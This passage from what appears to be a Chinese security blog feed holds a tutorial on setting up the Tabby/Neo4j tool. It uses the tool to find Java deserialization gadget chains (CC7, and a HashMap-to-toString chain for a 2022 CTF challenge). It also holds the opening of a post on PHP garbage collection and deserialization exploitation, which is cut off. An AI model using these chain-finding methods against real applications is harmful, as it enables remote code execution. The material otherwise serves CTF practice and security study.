        <content type="html"><![CDATA[<h1 id="Tabby安装配置及使用"><a href="#Tabby安装配置及使用" class="headerlink" title="Tabby安装配置及使用"></a>Tabby安装配置及使用</h1><h2 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>官网直接下 <a href="https://neo4j.com/download/">Neo4j Desktop Download | Free Graph Database Download</a></p><p>下完打开初始化完可以看到数据库版本，下对应版本的APOC插件 </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321216.png" alt="image-20230501151304382"></p><h3 id="新建Neo4j图数据库"><a href="#新建Neo4j图数据库" class="headerlink" title="新建Neo4j图数据库"></a>新建Neo4j图数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321510.png" alt="image-20230501152338340"></p><p>可以选择更新数据库版本到5.4.0</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321584.png" alt="image-20230501162942114"></p><p>打开数据库旁的<code>···</code>-&gt;<code>Settings...</code>更改以下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#允许从本地任意位置载入csv文件(大概在前面几行)</span><br><span class="hljs-comment">#server.directories.import=import</span><br><span class="hljs-comment">#允许 apoc扩展（大概在配置文件末尾部分）</span><br><span class="hljs-attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*<br><span class="hljs-comment"># 修改内存相关配置 </span><br><span class="hljs-comment"># 可以通过官方的neo4j-admin来推荐配置内存大小</span><br><span class="hljs-attr">dbms.memory.heap.initial_size</span>=<span class="hljs-number">1</span>G<br><span class="hljs-attr">dbms.memory.heap.max_size</span>=<span class="hljs-number">4</span>G<br><span class="hljs-attr">dbms.memory.pagecache.size</span>=<span class="hljs-number">4</span>G<br></code></pre></td></tr></table></figure><p>配置 apoc 的配置，需要找到配置文件目录，在这个目录下新建 apoc.conf 文件，内容为</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321995.png" alt="image-20230501161001178"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">apoc.import.file.enabled</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">apoc.import.file.use_neo4j_config</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>最后，配置一下 apoc 和 tabby 插件，打开 plugins 目录将对应的 jar 复制到与上面conf同目录下的plugins目录</p><p>tabby插件：<a href="https://github.com/wh1t3p1g/tabby/releases">Releases · wh1t3p1g&#x2F;tabby · GitHub</a> （在env目录里,同时把env里面几个apoc的jar包都<strong>复制</strong>到plugins里）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321885.png" alt="image-20230501163440727"></p><h3 id="验证配置"><a href="#验证配置" class="headerlink" title="验证配置"></a>验证配置</h3><p>重启数据库后，open-&gt;Neo4j Browser,测试查询语句，查看一下apoc（有30项）和tabby（有两项）的配置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321101.png" alt="image-20230501163735244"></p><h3 id="简单启动"><a href="#简单启动" class="headerlink" title="简单启动"></a>简单启动</h3><p>在下载的tabby文件夹中新建一个case目录，下面放目标jar,同时修改config&#x2F;settings.properties</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321272.png" alt="image-20230501190832777"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321030.png" alt="image-20230501191148762"></p><p>使用jdk8启动tabby.jar，命令行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>可能出现的报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">java.lang.IllegalStateException: Failed to execute CommandLineRunner<br>at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]<br>at tabby.App.main(App.java:28) [classes!/:na]<br>at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]<br>at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]<br>at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]<br>....<br></code></pre></td></tr></table></figure><blockquote><p>把config&#x2F;settings.properties中的<code>tabby.cache.isDockerImportPath</code>设置为false，这个选项用于判断当前是否是docker环境,如果是本机直接使用，要设置成false</p></blockquote><h3 id="图数据库索引配置"><a href="#图数据库索引配置" class="headerlink" title="图数据库索引配置"></a>图数据库索引配置</h3><p>可以加快导入&#x2F;删除的速度，只要在Neo4j browser里运行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cql">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>#之后可以运行下面命令来查看表库和数据库信息<br>:schema <br>:sysinfo <br></code></pre></td></tr></table></figure><h2 id="0x01简单使用"><a href="#0x01简单使用" class="headerlink" title="0x01简单使用"></a>0x01简单使用</h2><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>以找cc链为例，将tabby目录下的配置文件的tabby.build.target该成commons-collections jar所在位置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322228.png" alt="image-20230504085113381"></p><p>shell运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><blockquote><p>注意要使用java8</p></blockquote><p>成功连接数据库</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322970.png" alt="image-20230504085210709"></p><h3 id="可能的报错"><a href="#可能的报错" class="headerlink" title="可能的报错"></a>可能的报错</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322071.png" alt="image-20230504085257308"></p><blockquote><p>原因：Neo4j数据库未开启，即使数据库未开启，刚开始的info仍显示有”default”数据库</p></blockquote><p>出现下图即表示导入完毕</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322896.png" alt="image-20230504085512803"></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>打开Neo4j browser，用以下语句查询CC7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cql">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path<br></code></pre></td></tr></table></figure><blockquote><p>可以很明显的看到是从Hashtable的readObject为起点，hashtable反序列化时调用<strong>reconstitutionPut方法</strong>，在这个方法的执行流程中会调用equals判断key是否重复，如果调用的是AbstractMap的equals，之后会触发LazyMap的get，之后就是常规的触发transform</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322187.png" alt="image-20230504091827921"></p><blockquote><p>查询结果节点以id显示，点击后可以在右框查看属性</p></blockquote><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><ul><li><p>Neo4j中有三种指向：<code>() - [] -&gt; ()</code>、<code>() &lt;- [] - ()</code>和<code>() - [] - ()</code>。顾名思义，前两种就是看箭头方向表示对应的单项关系；最后一种表示双向关系</p></li><li><p>形如<code>[:CALL]</code>的可以认为给调用边起一个别名CALL</p></li><li><p>对于每个节点，SIGNATURE属性存储着完整的方法名称</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322332.png" alt="image-20230504091725958"></p></li><li><p>上述查询语句中equals方法后为<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>的意思即为：如果在1到N层关系中存在路径，将返回开始点和结束点，若缺省开头，则默认从1开始，所以<code>[:ALIAS*..2]</code>表示找两层以内的方法</li></ul></li><li><p>在Neo4j查询语句CQL中可以设定指定方向，如<code>-[:CALL ]-&gt;</code>,而<code>-[:ALIAS*1..2]-</code>没有指定方向，说明关系内的方法只能作为alias,可以理解为从当前节点向外广度延伸以搜索能调用到下一个方法节点的调用链</p></li><li><p>每个节点都有两个属性 IS_SINK IS_SOURCE ，分别代表是否是结尾节点和起始节点</p></li></ul><p>根据查询结果很容易发现调用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322538.png" alt="image-20230504123909760"></p><h2 id="0x02CTF中使用"><a href="#0x02CTF中使用" class="headerlink" title="0x02CTF中使用"></a>0x02CTF中使用</h2><p>上面找cc链的过程指向性比较强，在ctf中，可以利用该工具找到两个方法之间的调用链</p><h3 id="长城杯-2022-b4bycoffee"><a href="#长城杯-2022-b4bycoffee" class="headerlink" title="[长城杯 2022]b4bycoffee"></a>[长城杯 2022]b4bycoffee</h3><p>题目给出源码，反编译一下，coffeeBean的toString有个字节码后门</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322562.png" alt="image-20230504124900205"></p><p>反序列化入口，跟进一下AntObjectInputStream</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323091.png" alt="image-20230504125123715"></p><p>在反序列化时设置了黑名单类，过滤了这些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323797.png" alt="image-20230504125216104"></p><p>现在只要触发toString，但是常用的BadAttributeValueExpException被ban了，注意到依赖中存在rome，可以用EqualsBean的hashcode方法可以触发到任意类的toString方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323020.png" alt="image-20230504125407054"></p><p>但是这题也可以用tabby找一个readObject-&gt;toString的链子，写出以下查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cql">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)<br>with source, collect(sink) as sinks<br>call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])<br>return path limit 1<br></code></pre></td></tr></table></figure><blockquote><p>设置起始节点为HashMap的readObject，结束节点为toString方法</p><p>之后排除了BadAttributeValueExpException等方法</p><p>tabby内的findJavaGadget接口会通过污点传播，根据java原生反序列化的规则来查找利用链，个参数分别表示起始节点、结束节点、路径的最大节点数、isBackward、depthFirst</p></blockquote><p>非常清晰的jdk原生利用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323655.png" alt="image-20230504130444449"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.ctfiot.com/64572.html">Java代码分析工具Tabby在CTF中的运用 | CTF导航 (ctfiot.com)</a></p><p><a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">Tabby 源码分析 | m0d9’s blog</a></p><p><a href="https://www.cnblogs.com/ljhdo/p/10929702.html">Neo4j 第九篇：查询数据（Match） - 悦光阴 - 博客园 (cnblogs.com)</a></p><p>[tabby&#x2F;Tabby 食用指北.md at master · wh1t3p1g&#x2F;tabby · GitHub](<a href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby">https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby</a> 食用指北.md)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP垃圾回收器与反序列化利用</title>
      <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p><h3 id="PHP5-3之前"><a href="#PHP5-3之前" class="headerlink" title="PHP5.3之前"></a>PHP5.3之前</h3><p>采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容</p><p>存在问题：两个或多个对象相互引用，使得计数器永远不为0，导致内存对象无法被回收</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>加入复杂算法检测引用环的存在，避免内存泄露。</p><p>每个php变量存在一个叫zval的变量容器中，存储了变量的类型和值，还存储了“is_ref”bool型变量以标识该变量是否属于引用集合；还有一个“refcount”，用于表示指向这个zval变量容器的变量个数，注意，多个变量是可以共用一个变量容器的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> );<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码会输出</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27; </span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="PHP7的NTS版本"><a href="#PHP7的NTS版本" class="headerlink" title="PHP7的NTS版本"></a>PHP7的NTS版本</h3><p>在该版本，上述通过赋值同一个变量的情况已经不会再被计数，PHP7中，zval可以被引用计数或不被引用</p><ul><li>对于null，bool，int和double的类型变量，refcount永远不会计数；</li><li>对于对象、资源类型，refcount计数和php5的一致；</li><li>对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串也不计数</li><li>对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试字符串引用计数&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试数组引用计数&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$c</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试int型计数&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;e&#x27;</span> );<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">测试字符串引用计数<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>) <span class="hljs-comment">//取地址引用时会改变</span><br>测试数组引用计数<br>c:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">3</span>, is_ref=<span class="hljs-number">0</span>) <br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-comment">//数组值改变后，之前引用全部废弃</span><br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">3</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">2</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;c&#x27;</span> (length=<span class="hljs-number">1</span>)<br>测试<span class="hljs-keyword">int</span>型计数e:(refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">int</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//int型不计引用次数</span><br></code></pre></td></tr></table></figure><h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>PHP垃圾回收机制默认打开，可以设置php.ini值的<code>zend.enable_gc</code>，或者调用gc_enable() 和 gc_disable()函数。</p><p>当垃圾回收机制打开时，算法判断在根缓存区满时，执行循环查找，根缓存区大小需要通过修改php源码文件Zend&#x2F;zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES，然后重新编译PHP，来修改这个值。</p><blockquote><p>调用gc_disable()函数释放内存之前，先调用gc_collect_cycles()函数，以免根缓存区空间不足</p></blockquote><h3 id="垃圾的产生"><a href="#垃圾的产生" class="headerlink" title="垃圾的产生"></a>垃圾的产生</h3><p>PHP中一些复杂数据类型头部有一个GC，用于支持垃圾回收。</p><p>zend_reference 这个类型，这个是 PHP7 新增的变量类型，当对变量使用 “&amp;” 操作时，<u>会创建新的中间结构体 zend_reference，这个结构体会真正的指向对应的 value 结构。</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当进行如下赋值操作时</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-comment">// $a -&gt; zend_string</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b,$a -&gt; zend_string</span><br><span class="hljs-variable">$c</span> = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png" alt="image-20230405153644317"></p><blockquote><p><code>$b和$c</code>的zval都是通过中间结构体再指向最终的zend_string</p></blockquote><h3 id="回收的过程"><a href="#回收的过程" class="headerlink" title="回收的过程"></a>回收的过程</h3><p>如果当变量的 refcount 减小后大于 0，PHP 并不会立即对这个变量进行垃圾鉴定和回收，而是放入一个缓冲区中，等这个缓冲区满了以后 (10000 个值) 再统一进行处理，加入缓冲区的是变量 zend_value 里的 gc，目前垃圾只会出现在数组和对象两种类型中，数组的情况上面已经介绍了，对象的情况则是成员属性引用对象本身导致的，其它类型不会出现这种变量中的成员引用变量自身的情况，所以垃圾回收只会处理这两种类型的变量。</p><p>gc 的结构 zend_refcounted_h 具体如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_refcounted_h</span> &#123;<br>    <span class="hljs-type">uint32_t</span>         refcount; <span class="hljs-comment">// 记录 zend_value 的引用数</span><br>    <span class="hljs-keyword">union</span> &#123;<br>        <span class="hljs-keyword">struct</span> &#123;<br>            zend_uchar    type,  <span class="hljs-comment">// zend_value的类型, 与zval.u1.type一致</span><br>            zend_uchar    flags, <br>            <span class="hljs-type">uint16_t</span>      gc_info <span class="hljs-comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span><br>        &#125; v;<br>        <span class="hljs-type">uint32_t</span> type_info;<br>    &#125; u;<br>&#125; zend_refcounted_h;<br></code></pre></td></tr></table></figure><p>一个变量只能加入一次缓冲区，为了防止重复加入，变量加入后会把 zend_refcounted_h.gc_info 置为 GC_PURPLE，即标为紫色，后续不会重复插入。</p><h2 id="反序列化中的利用"><a href="#反序列化中的利用" class="headerlink" title="反序列化中的利用"></a>反序列化中的利用</h2><h3 id="destruct魔术方法"><a href="#destruct魔术方法" class="headerlink" title="__destruct魔术方法"></a>__destruct魔术方法</h3><p>当某个对象成为垃圾或者当对象被显式销毁时执行</p><ul><li>显示销毁：unset或赋值NULL</li><li>隐式销毁：代码执行完毕后将所有申请的内存释放掉</li></ul><blockquote><p>在常规思路中destruct是隐式销毁触发的,尝试显式销毁</p></blockquote><h3 id="旧版本GC"><a href="#旧版本GC" class="headerlink" title="旧版本GC"></a>旧版本GC</h3><p>简单的判断了一下变量的zval的refcount是否为0，是的话就释放否则不释放直至进程结束。</p><h3 